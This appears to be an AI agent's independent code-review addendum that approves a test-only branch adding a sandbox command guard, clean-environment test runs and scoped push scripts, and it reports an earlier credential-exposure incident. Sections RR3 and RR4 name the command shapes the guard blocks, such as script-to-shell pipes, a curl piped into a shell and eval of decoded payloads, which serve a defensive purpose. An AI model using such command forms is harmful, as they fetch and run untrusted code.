**GO for code integration** of tasks 1–3 plus 2.5–2.7, because there is no production-code diff, assertions are preserved, and every targeted suite passes through the clean environment. Conditions:

1. The owner records the incident disposition: authorize or refuse cleanup of the three paths, and decide on credential rotation. The historical exposure is **not** closed.
2. Decide R-W1 (fix or reword) and R-W2 (guard or accept) before the task 4 full run.
3. Keep the Node 24.18.0 limit on record. This is not a certification of full acceptance: tasks 4–5 are pending, and the official group inventory, shard coverage and exit codes are untested here.


---

# Second re-review addendum (HEAD `fc3fd4ee6`, tasks 2.5 and 2.8 closure)

Everything above this line is the previous review report, preserved completely intact and byte-identical (SHA-256 of the prefix file before this append: `6611ef32eb4c44b0e517f3f47be749db9b68c7ef1f679804694b16dbeebaca5c`, 352 lines). This addendum is the only addition. The reviewer is a fresh independent agy Gemini 3.8 Flash High session; this untracked file is the only edit made to the repository.

## RR1. Snapshot and scope

| Item | Value |
|---|---|
| Branch / HEAD | `fix/portable-validation-baseline` / `fc3fd4ee6e724add20cccbde2fc82950c71e5d53` |
| Tree | `55f3e64728e2b8910dceaac2d130e5881f17741b`; `git status` before and after: only this report file untracked |
| Reviewed range | `3748b57b8..fc3fd4ee6` (and cumulative diff against `a194166017`) |
| Production code diff | **Zero.** (`server/src/services/`, `server/src/routes/`, `cli/`, `ui/`, production exports: 0 diff, 0 new production dependencies) |
| Toolchain | Node v24.18.0 (`/Users/Hermes/.nvm/versions/node/v24.18.0/bin/node`), Git 2.56.0 (`/private/tmp/pi-dedup-git-toolchain/bin/git`), pnpm 9.15.4 (Corepack cache `/private/tmp/pv-clean-tools/corepack`), Python 3.9.6 (`/usr/bin/python3`) and 3.15.2 (`/opt/homebrew/bin/python3`) |
| Safety & limits observed | Native tools only; read scoped local files only; no secrets inspected; no real Cursor binary executed; no deletion of incident evidence; clean-env runner used for all real fixtures; static inspection only for approved push scripts |

Parent OpenSpec normative artifacts at `/Volumes/AI/projects/paprerclip-v2/openspec/changes/portable-validation-and-enrollment-regression/` match candidate files byte-for-byte in `proposal.md`, `design.md`, and `specs/`. Checkbox progress difference (`tasks.md`) remains: candidate marks tasks 1.1–2.4, 2.6–2.7, 3.1–3.3 done, while tasks 2.5, 2.8, and 4.1–5.3 remain unchecked (`- [ ]`).

## RR2. Verdict

| Assessment Area | Status | Evidence / Notes |
|---|---|---|
| **R-W1 Closure (Path-shaped commands fail-closed)** | **RESOLVED** | Bounded allowlist & owned root validation (`assertOwnedRoots`) refuse arbitrary path-shaped commands, bare interpreters, and shell pipelines before execution (§RR3). |
| **R-W2 Closure (All 5 fake sandbox runners guarded)** | **RESOLVED** | All 5 fake runners across server and cursor-local package are now wrapped with `createCursorSandboxRunner` / `createGuardedSandboxRunner` and tested with inert bypass probes (§RR4). |
| **Tasks 2.5 & 2.8 verification** | **VERIFIED** | Code, tests, and documentation satisfy all requirements of tasks 2.5 and 2.8 (§RR3, §RR4, §RR5). |
| **Assertions & SUT integrity** | **PRESERVED** | Original command discovery, PATH, custom command, auth, step usage, and enrollment assertions remain intact and passing (§RR6). |
| **Push scripts static inspection** | **VERIFIED** | `/private/tmp/pv-approved-push/pr1-push.mjs` and `pr2-push.mjs` strictly verified; no CLI args allowed, trusted Git 2.56 `execFile`, exact URLs and refs (§RR7). |
| **Safe for integration & push** | **GO** | Safe to integrate tasks 1–3 and push branch `fix/portable-validation-baseline` and `fix/pi-single-prompt-summary-dedup` via approved scripts (§RR9). |
| **Full acceptance (tasks 4–5)** | **PENDING** | **NOT certified.** Grouped end-to-end acceptance remains pending as designed. |

Counts: **CRITICAL 0. WARNING 0. SUGGESTION 2.**

## RR3. R-W1 Verification: Path commands & command position fail-closed (task 2.8)

In the previous review, R-W1 identified that `replacePaths` blanked tokens containing `/` before vocabulary checks, allowing path-shaped commands (e.g. `/bin/sh /tmp/x/script`, `cat payload | /bin/sh`, `./dl`, etc.) to bypass checks.

**Resolution in `packages/adapter-utils/src/test-fixtures/sandbox-call-guard.ts`:**
1. **Per-test Owned Roots (`assertOwnedRoots`):**
   - The guard strictly rejects `os.tmpdir()` itself or any of its ancestors.
   - Requires explicit per-test directories created via `mkdtemp`, located strictly below `os.tmpdir()`, owned by the current UID, and with non-world-writable permissions (`(stat.mode & 0o022) === 0`).
2. **Explicit Executables Allowlist:**
   - Any non-shell command MUST be in `policy.executables` and MUST resolve strictly below an owned root.
   - Path-shaped commands (`./dl`, `/usr/bin/curl`, `/bin/sh`, `/usr/bin/env`) that are not explicitly registered in `executables` are rejected before any backend is invoked (`command ... is not a registered shell or fixture executable`).
3. **Strict Shell Form Matching:**
   - Shell commands (`sh`, `bash`) require exact arguments `["-c", script]` or `["-lc", script]`. Bare shells, `sh -s`, `bash -`, and stdin to shell are refused.
   - Scripts are matched against registered templates (`ShellForm`) or a chain of templates joined by `&&`.
   - Any path placeholder (`@path@`, `@inner@`) must be quoted and must resolve strictly inside an owned root.
   - Pipelined commands, unlisted subshells, backticks, `$()`, and arbitrary `-e`/`-c` scripts are rejected.
4. **Pure Unit Test Proof:**
   - In `sandbox-call-guard.test.ts`, all counterexamples (`/bin/sh ${script}`, `cat ${script} | /bin/sh`, `/usr/bin/c?rl ... | /bin/sh`, `./dl ...`, `/usr/bin/env ...`, `eval`, decoded payloads) are verified to be refused as pure data and via recording sentinel backends (67/67 tests passed).

## RR4. R-W2 Verification: All 5 Fake Runners Uniformly Guarded (task 2.8)

In the previous review, R-W2 noted that runners in `packages/adapters/cursor-local` (`execute.test.ts` and `test.test.ts`) were fail-open on string drift.

**Resolution:**
All 5 fake sandbox runner instances in the repository now share the provider-neutral guard:
1. `packages/adapters/cursor-local/src/server/execute.test.ts`:
   - `createFreshLeaseSandboxRunner`: wraps `createCursorSandboxRunner` with explicit test root and executable.
   - Managed runtime restore runner: wraps `createCursorSandboxRunner` with explicit test root and executable.
   - Verified with `createInertBypassProbes` asserting rejection of all 9 bypass forms before any spawn.
2. `packages/adapters/cursor-local/src/server/test.test.ts`:
   - `createSandboxRunner`: wraps `createCursorSandboxRunner` with explicit root and executable.
   - Verified with `createInertBypassProbes`.
3. `packages/adapters/cursor-local/src/server/remote-command.test.ts`:
   - `createLocalSandboxRunner`: wraps `createCursorSandboxRunner` with explicit test root and empty `executables: []`.
   - Verified with `createInertBypassProbes`.
4. `server/src/__tests__/cursor-local-execute.test.ts`:
   - `createLocalSandboxRunner`: wraps `createCursorSandboxRunner` with explicit test root and executables.
   - Verified with `createInertBypassProbes`.
5. `server/src/__tests__/cursor-local-adapter-environment.test.ts`:
   - `createLocalSandboxRunner`: wraps `createCursorSandboxRunner` with explicit test root and executables.
   - Verified with `createInertBypassProbes`.

In all runners, `installStub` only replaces the exact `SANDBOX_INSTALL_COMMAND` in-memory with a harmless local directory/capture command; any drift, altered URL scheme (`http://`), or unexpected install command fails closed before execution.

## RR5. Incident Record Truthfulness & Boundary Audit (task 2.5)

1. **Incident Audit Truthfulness:**
   - Documentation in `doc/plans/2026-11-05-portable-validation-verification.md` (§10.1) and `doc/DEVELOPING.md` accurately describes that the downloaded Cursor CLI was actually executed during the earlier probe, ran PID 95377, wrote `.running` and compile cache, generated session log in real `$TMPDIR` (`cursor-agent-logs-502`), and inherited the parent process environment.
   - Historical exposure is acknowledged as unfixable from disk artifacts alone. No false "all-clear" is claimed.
2. **Preservation of Incident Evidence:**
   - Incident directories verified on disk:
     - `/var/folders/0w/j69x0g910m182rtbp39_14dm0000gp/T/probe-RE6HFW` (mtime 09:06)
     - `/var/folders/0w/j69x0g910m182rtbp39_14dm0000gp/T/probe-F4lJKQ` (mtime 09:07)
     - `/var/folders/0w/j69x0g910m182rtbp39_14dm0000gp/T/cursor-agent-logs-502` (mtime 09:07)
   - All three remain untouched and preserved. No unauthorized deletion or credential rotation was attempted. Residual decisions remain with the owner.
3. **Clean-env Scope and Non-Sandbox Boundaries:**
   - `scripts/validation-clean-env.mjs` defines environment sanitation via an allowlist of 16 variable names, isolated synthetic `HOME`, `PAPERCLIP_HOME`, and `TMPDIR`.
   - Documentation explicitly affirms that `clean-env` is NOT an OS sandbox:
     - Tools querying the user database or macOS Keychain (such as OpenSSH clients or system credential helpers) are outside its isolation.
     - Variable filtering is name-based allowlisting and does not scan secret values.
     - Process termination via uncatchable signals (`SIGKILL`) leaves temporary directories uncleaned.
     - Fake runners require `clean-env` execution for outer environment hygiene.
4. **Causal Diagnosis Limit:**
   - The diagnosis for enrollment timing (`ack=0`) and idle socket keepalive is explicitly documented as verified on Node v24.18.0 / undici 7.28.0 only.

## RR6. Independent Clean-Environment Test Results

All tests were independently executed using Node v24.18.0 through `scripts/validation-clean-env.mjs` with `--bin /private/tmp/pi-dedup-git-toolchain/bin --set COREPACK_HOME=/private/tmp/pv-clean-tools/corepack`:

| Test Suite | Files | Tests | Result | Notes |
|---|---|---|---|---|
| Preflight unit tests (`test:validation-preflight`) | 1 | 12 | **12 passed** (0 fail) | Read-only boundaries, Git `--not`, locks, temp error handling |
| Clean-env unit tests (`test:validation-clean-env`) | 1 | 7 | **7 passed** (0 fail) | Synthetic sentinels stripped, owned roots created/cleaned |
| Preflight blocker check (`validation-preflight.mjs --stage blockers`) | - | 7 checks | **PASS** (exit 0) | Node 24.18.0, pnpm 9.15.4, Git 2.56.0, Python 3.9.6 |
| Muse Python contract (`muse-client-contract.py`) - Python 3.9.6 | 1 | 64 | **64 passed** (0 fail) | Local mock HTTPError, ByteIO body closed |
| Muse Python contract (`muse-client-contract.py`) - Python 3.15.2 | 1 | 64 | **64 passed** (0 fail) | Python 3.15 compatibility |
| Server targeted suite (6 files) | 6 | 66 | **66 passed** (0 fail) | cursor-local-execute (8), sandbox-install-guard (28), muse-client-contract (19), fake-clock-io (3), github-connection-enrollment-work (1), cursor-local-adapter-environment (7) |
| Cursor-local package suite (3 files) | 3 | 15 | **15 passed** (0 fail) | execute.test.ts (9), test.test.ts (3), remote-command.test.ts (3) |
| Adapter-utils guard unit suite (1 file) | 1 | 67 | **67 passed** (0 fail) | sandbox-call-guard.test.ts (67) |

### Test Count Reconciliation
- Total Vitest tests: **148 passed** across 10 test files (66 server + 15 cursor-local + 67 adapter-utils).
- *Discrepancy Note:* A summary mention of "88" in earlier communication reflected an outdated server test count (which had 87 tests in commit `e87a10b5c` prior to refactoring unit tests into `adapter-utils`). The exact and verified count is **66 + 15 + 67 = 148 Vitest tests**, plus 12 preflight unit tests, 7 clean-env unit tests, and 64 Python contract tests.

## RR7. Static Inspection of Approved Push Scripts

Inspected `/private/tmp/pv-approved-push/pr1-push.mjs` and `/private/tmp/pv-approved-push/pr2-push.mjs` (static inspection only, never executed):

1. **SHA-256 Hashes:**
   - `pr1-push.mjs`: `eb05754a503f085b2e02f9ce172cd6d7c48706538ba51a37e2276729c5356011` (exact match)
   - `pr2-push.mjs`: `9260d96563f631bba2885cd2f4c01b58f6ce2dd1e6df240018b0aa8373696d43` (exact match)
2. **CLI Argument Rejection:**
   - Both scripts start with `if (process.argv.length > 2) { process.stderr.write(...); process.exit(1); }` before any action, rejecting any CLI arguments or flags.
3. **Execution Model:**
   - Uses `child_process.execFile` (promisified), without `shell: true`. No shell expansion or command injection is possible.
   - Pinned Git binary: `const GIT_BIN = "/private/tmp/pi-dedup-git-toolchain/bin/git";` (verified Git 2.56.0).
4. **Target & Scope:**
   - Repository locked to `REPO_DIR = "/Volumes/AI/projects/paprerclip-v2";`.
   - Push URL locked to `APPROVED_URL = "https://github.com/heartpleasure101-stack/paperclip.git";`.
   - Origin verification: checks `git remote get-url --push origin` against `APPROVED_URL` before pushing.
   - Ref verification: checks `git rev-parse --verify REF` before pushing.
   - PR1 ref: `refs/heads/fix/pi-single-prompt-summary-dedup`.
   - PR2 ref: `refs/heads/fix/portable-validation-baseline`.
   - Push command: `git -C <REPO_DIR> push <APPROVED_URL> <REF>:<REF>` — single ordinary push, no `--force`, no `--no-verify`, no hooks bypassed.

## RR8. Source Hashes (SHA-256)

Verified before and after test runs:

```
8e614f20b0b031af10303fd824e5286251f6ef42acc0f3621d39025973d02c93  packages/adapter-utils/src/test-fixtures/sandbox-call-guard.ts
3b4a63fc7079e81be7975b3fa383d1c7d1ef3487ed94ad1a619f7febe1de973a  packages/adapter-utils/src/test-fixtures/sandbox-call-guard.test.ts
f04056669a573f25dea3d2abd1a71adf014c1d03f4c615ae3f54cb5ae6e88f97  packages/adapter-utils/src/test-fixtures/sandbox-fixture-runner.ts
e3c84e7cc88c647958ece5d5a14301dcc983fce37200059b60368c317425807f  packages/adapters/cursor-local/src/server/cursor-sandbox-test-policy.ts
b5eb0b479ac2200f3722c755c66374c60958a446f74858875af1e62963d7c24d  packages/adapters/cursor-local/src/server/execute.test.ts
42a1d4f32df84db0d81a8403f9645a13ba3991cde60806699d965fb6b0a49d7a  packages/adapters/cursor-local/src/server/test.test.ts
2f02ed0785a1185e952feee86c77ff9019e263db83d41d3ffec845fdf97d86fc  packages/adapters/cursor-local/src/server/remote-command.test.ts
51df6f263e29413b6ab4a1551844d5b1ad15eefac1ff4a8265d284090e7d6864  server/src/__tests__/helpers/sandbox-install-guard.ts
46d8667702404c0bf8b7505dc65998212956e744557d6f669a8bb009781ed1ca  server/src/__tests__/sandbox-install-guard.test.ts
2d34f41b84fb4342eb60c67262985c70a4828436ef53b63007209e0fb2ae9f57  server/src/__tests__/cursor-local-execute.test.ts
28bc317c015f63b42904e28fb91ce38be06fb8e08e807f80664755d552aeef26  server/src/__tests__/cursor-local-adapter-environment.test.ts
db5be479bc2e213b1b689048644b7477f1ee9d9bbd7e32053a767d2a550861b6  server/src/__tests__/fake-clock-io.test.ts
553845ea66cb7071504a2b40798c2ef3c7162fe0dbe1158ea0fb35fb7fc5e0aa  server/src/__tests__/fixtures/muse-client-contract.py
2f88a340c25142185d0ee92a5c1bd3b3ec1deab9a690d21c2bbff0b47bb96add  server/src/__tests__/github-connection-enrollment-work.test.ts
233d12abe0afae127475e00816b694388552c985b4821fc41fdf808bddc4a465  scripts/validation-clean-env.mjs
dc813d2459091e413bcbac6292b7bee53cb82ec8edc391691a76bf1ea6b2612b  scripts/validation-clean-env.test.mjs
cd672c38c19cc62863ff0187ba07de94002317681bf42fe19a76feb934f61dac  scripts/validation-preflight.mjs
cdb268394f4fd8b5ee257b47508c658b09db9f2c61213f9a369a294fc32780b8  scripts/validation-preflight.test.mjs
9b7f046089c7b8e659e3a6564b3452e498b5f6d11c88a786706b51211ab662d5  doc/DEVELOPING.md
a0d5a5d50d52eaff9abcb0e347983cc090e00014d69e306feebce86947dd584c  package.json
```

Git status before and after review: only `doc/plans/2026-11-05-portable-validation-independent-review.md` is untracked. Stash list: 0.

## RR9. Findings and Go / No-Go Recommendation

### CRITICAL Findings
**None.**

### WARNING Findings
**None.** (Previous warnings W1, W2, R-W1, R-W2 are all formally resolved and verified).

### SUGGESTIONS
1. **Push Script Environment Isolation:** `pr1-push.mjs` and `pr2-push.mjs` inherit caller `process.env`. While safe in practice given hardcoded URL and refs, explicit environment sanitization in `execFileAsync` would provide additional isolation from caller shell overrides.
2. **Parent Checkbox Alignment:** Candidate worktree `tasks.md` has completed items checked while parent `/Volumes/AI/projects/paprerclip-v2/openspec/changes/portable-validation-and-enrollment-regression/tasks.md` has checkboxes unchecked. The implementer/coordinator should align tasks 2.5 and 2.8 in both copies upon recording this review evidence.

### Go / No-Go Recommendation
- **GO FOR INTEGRATION:** The code changes in `fc3fd4ee6` completely resolve R-W1 and R-W2, contain zero production code diff, maintain all original assertions, enforce strict per-test roots and command allowlists, and pass all clean-environment test suites without network access.
- **GO FOR PUSH VIA APPROVED SCRIPTS:** The approved push scripts `/private/tmp/pv-approved-push/pr1-push.mjs` and `pr2-push.mjs` are verified safe, correctly scoped to the approved repository and branch targets, and ready for execution by the user/coordinator.
- **TASKS 4 & 5 REMAIN PENDING:** Full acceptance (broad suite integration, matrix runs, artifact archiving) is not certified by this review and remains to be executed in subsequent planned steps.
